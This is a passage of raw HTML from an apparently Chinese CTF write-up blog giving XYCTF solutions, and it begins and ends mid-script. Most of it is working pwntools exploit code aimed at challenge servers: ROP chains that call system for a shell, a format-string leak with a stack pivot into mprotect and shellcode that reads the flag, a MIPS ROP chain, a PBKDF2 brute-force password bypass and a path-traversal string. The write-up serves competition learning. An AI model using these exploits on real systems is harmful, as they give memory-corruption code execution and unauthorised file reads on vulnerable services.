operator\">=</span>u64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x7f\"</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x21b780</span>\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span>\n\n\nrsi<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x2be51</span>\nrsi_rdx<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x118f2f</span>\nrdi<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x2a3e5</span>\n\nbinsh<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x1d8678</span>\nsystem<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0xeb080</span>\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span>\n\np<span class=\"token operator\">=</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">528</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4040a0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rsi_rdx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span>\nsl<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\nshell<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n\n\n<h3 id=\"web苦手\"><a href=\"#web苦手\" class=\"headerlink\" title=\"web苦手\"></a>web苦手</h3><p>两个密码生成的密钥只要最高位为00就可以绕过检测</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> hashlib\n<span class=\"token keyword\">import</span> itertools\n<span class=\"token keyword\">import</span> string\n\nsalt <span class=\"token operator\">=</span> <span class=\"token string\">b\"XYCTF\"</span>\niterations <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\ndklen <span class=\"token operator\">=</span> <span class=\"token number\">32</span>\n\ncharset <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>ascii_letters <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>digits  <span class=\"token comment\"># a-zA-Z0-9</span>\n\n<span class=\"token keyword\">for</span> length <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">67</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> candidate <span class=\"token keyword\">in</span> itertools<span class=\"token punctuation\">.</span>product<span class=\"token punctuation\">(</span>charset<span class=\"token punctuation\">,</span> repeat<span class=\"token operator\">=</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        password <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>candidate<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        key <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>pbkdf2_hmac<span class=\"token punctuation\">(</span><span class=\"token string\">\"sha1\"</span><span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">,</span> salt<span class=\"token punctuation\">,</span> iterations<span class=\"token punctuation\">,</span> dklen<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Found password:\"</span><span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span>errors<span class=\"token operator\">=</span><span class=\"token string\">\"ignore\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#J</span>\n<span class=\"token comment\">#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaae2</span>\n</code></pre>\n\n<p>用这两个密码登陆之后目录穿越拿到真的flag</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token operator\">/</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token operator\">/</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token operator\">//</span>flag</code></pre>\n\n<h3 id=\"girlfriend\"><a href=\"#girlfriend\" class=\"headerlink\" title=\"girlfriend\"></a>girlfriend</h3><p>栈迁移打mprotect，之后用openat, mmap, write 读flag</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"DEBUG\"</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token comment\">#io=process(\"./chal\")</span>\nio<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"47.94.15.198\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34840</span><span class=\"token punctuation\">)</span>\n\nr <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nrl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>    a<span class=\"token operator\">=</span><span class=\"token boolean\">False</span>        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nru <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>    <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\ns <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsa <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nshell <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span>script<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>script<span class=\"token punctuation\">)</span>\n\n\nsa<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span>\np<span class=\"token operator\">=</span><span class=\"token string\">\"%7$p-%15$p-%3$p\"</span>\nsa<span class=\"token punctuation\">(</span><span class=\"token string\">\"first\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">\"name:\\n\"</span><span class=\"token punctuation\">)</span>\nleak<span class=\"token operator\">=</span>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"Y\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span><span class=\"token punctuation\">)</span>\ncanary<span class=\"token operator\">=</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\npie<span class=\"token operator\">=</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x18d9</span>\nlibc<span class=\"token operator\">=</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x114887</span>\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>pie<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span>\n\nread<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x1147d0</span>\nret<span class=\"token operator\">=</span>pie<span class=\"token operator\">+</span><span class=\"token number\">0x0157B</span>\nrdi<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x2a3e5</span>\nrax<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x45eb0</span>\nrsi<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x02be51</span>\nr12<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x35731</span>\nrdx_r12_r13<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0xa80c8</span>\nmprotect<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x11eaa0</span>\ncall<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x29d8e</span>\n\nsa<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span>\n\nrop<span class=\"token operator\">=</span><span class=\"token string\">\"X\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">=</span>rop<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"X\"</span><span class=\"token punctuation\">)</span>\n\nsc<span class=\"token operator\">=</span>asm<span class=\"token punctuation\">(</span><span class=\"token triple-quoted-string string\">\"\"\"\nmovabs rax, 0x67616C66\npush 0\npush rax\npush rsp\nmov rdi, -100\npop rsi\nxor rdx, rdx\nxor r10, r10\nmov rax, 0x101\nsyscall #openat(AT_FDCWD, \"flag.txt\", 0, 0);\n\nmov rdi, 0x1337000\nmov rsi, 0x1000\nmov rdx, 1\nmov r10, 1\nmov r8, rax\nxor r9, r9\nmov rax, 0x9\nsyscall #mmap(0x1337000, 0x100, PROT_READ | PROT_WRITE, rax, 1);\n\nmov rdi, 1\nmov rsi, 0x1337000\nmov rdx, 0x100\nmov rax, 1\nsyscall\n\"\"\"</span><span class=\"token punctuation\">)</span>\n\nrop<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pie<span class=\"token operator\">+</span><span class=\"token number\">0x4000</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x2000</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdx_r12_r13<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdx_r12_r13<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>mprotect<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#rop+=p64(rdi)+p64(0)</span>\n<span class=\"token comment\">#rop+=p64(rsi)+p64(pie+0x4000+0x1000)</span>\n<span class=\"token comment\">#rop+=p64(r12)+p64(0x100)</span>\n<span class=\"token comment\">#rop+=p64(rdx_r12_r13)+p64(0)*2</span>\n<span class=\"token comment\">#rop+=p64(read)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rax<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pie<span class=\"token operator\">+</span><span class=\"token number\">0x40d0</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>call<span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>sc\n\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">)</span>\nsa<span class=\"token punctuation\">(</span><span class=\"token string\">\"first\"</span><span class=\"token punctuation\">,</span> rop<span class=\"token punctuation\">)</span>\n\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\"Choice:\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span>\np<span class=\"token operator\">=</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">56</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pie<span class=\"token operator\">+</span><span class=\"token number\">0x04060</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pie<span class=\"token operator\">+</span><span class=\"token number\">0x1676</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#p=\"A\"*56+p64(canary)+\"A\"*8+p64(pie+0x1220)</span>\n<span class=\"token comment\">#debug()</span>\nsa<span class=\"token punctuation\">(</span><span class=\"token string\">\"?\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n\n\nsc<span class=\"token operator\">=</span>asm<span class=\"token punctuation\">(</span><span class=\"token triple-quoted-string string\">\"\"\"\nmovabs rax, 0x67616C66\npush 0\npush rax\npush rsp\nmov rdi, -100\npop rsi\nxor rdx, rdx\nxor r10, r10\nmov rax, 0x101\nsyscall #openat(AT_FDCWD, \"flag\", 0, 0);\n\nmov rdi, 0x1337000\nmov rsi, 0x1000\nmov rdx, 1\nmov r10, 1\nmov r8, rax\nxor r9, r9\nmov rax, 0x9\nsyscall #mmap(0x1337000, 0x100, PROT_READ | PROT_WRITE, rax, 1);\n\nmov rdi, 1\nmov rsi, 0x1337000\nmov rdx, 0x100\nmov rax, 1\nsyscall\n\"\"\"</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token comment\">#debug()</span>\nshell<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n\n\n<h3 id=\"明日方舟寻访模拟器\"><a href=\"#明日方舟寻访模拟器\" class=\"headerlink\" title=\"明日方舟寻访模拟器\"></a>明日方舟寻访模拟器</h3><p>让count变成sh之后传给system，因为输出被关所以把输出道到stderr</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"INFO\"</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token comment\">#io=process(\"./chal\")</span>\nio<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"47.94.172.18\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">28754</span><span class=\"token punctuation\">)</span>\n\nr <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nrl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>    a<span class=\"token operator\">=</span><span class=\"token boolean\">False</span>        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nru <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>    <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\ns <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsa <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nshell <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span>script<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>script<span class=\"token punctuation\">)</span>\n\n\np<span class=\"token operator\">=</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">72</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4018e5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x405bcc</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x04018FC</span><span class=\"token punctuation\">)</span>\n\nsl<span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span>\n\nsh<span class=\"token operator\">=</span><span class=\"token number\">0x6873</span>\n<span class=\"token keyword\">while</span> sh<span class=\"token operator\">></span><span class=\"token number\">10000</span><span class=\"token punctuation\">:</span>\n        sl<span class=\"token punctuation\">(</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span><span class=\"token string\">\"10000\"</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span>\n        sh<span class=\"token operator\">-=</span><span class=\"token number\">10000</span>\n\nsl<span class=\"token punctuation\">(</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span>\nsl<span class=\"token punctuation\">(</span><span class=\"token string\">\"6739\"</span><span class=\"token punctuation\">)</span>\nsl<span class=\"token punctuation\">(</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span>\n\nsl<span class=\"token punctuation\">(</span><span class=\"token string\">\"4\"</span><span class=\"token punctuation\">)</span>\nsl<span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#debug()</span>\ns<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n\nsl<span class=\"token punctuation\">(</span><span class=\"token string\">\"cat flag 1>&amp;2\"</span><span class=\"token punctuation\">)</span>\nshell<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n\n\n<h3 id=\"EZ-3-0\"><a href=\"#EZ-3-0\" class=\"headerlink\" title=\"EZ 3.0\"></a>EZ 3.0</h3><p>mips rop</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token number\">0x00400a20</span> <span class=\"token punctuation\">:</span> lw $a0<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">(</span>$sp<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">;</span> lw $t9<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">(</span>$sp<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">;</span> jalr $t9 <span class=\"token punctuation\">;</span> nop</code></pre>\n\n<p>这gadget可以把a0和t9控制，再跳到t9，a0为函数参数。把a0变成&#x2F;bin&#x2F;cat flag.txt，t9变成system</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'mips'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"INFO\"</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token comment\">#io=process([\"qemu-mipsel\",\"-g\",\"1234\",\"./ez\"])</span>\nio<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"47.94.15.198\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">26720</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#a=process(\"./ez\")</span>\n\nr <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nrl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>    a<span class=\"token operator\">=</span><span class=\"token boolean\">False</span>        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nru <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>    <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\ns <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsa <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nshell <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span>script<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tgdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>script<span class=\"token punctuation\">,</span>arch<span class=\"token 